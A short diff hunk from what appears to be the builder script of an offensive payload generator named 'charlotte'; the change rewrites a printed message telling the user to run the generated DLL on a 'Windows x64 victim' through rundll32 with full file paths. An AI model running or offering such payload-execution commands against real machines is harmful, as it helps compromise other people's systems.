@@ -195,7 +195,7 @@ def main():
     os.system("rm charlotte.cpp")
     time.sleep(1)
     print("[*]                    Execute on your Windows x64 victim with:    [*]")
-    print("[*]                    rundll32 charlotte.dll, " + e1 + "    [*]")
+    print("[*]                    C:\Windows\System32\rundll32.exe C:\Users\Public\Desktop\charlotte.dll, " + e1 + "    [*]")
     time.sleep(2)
     print("\n")
 
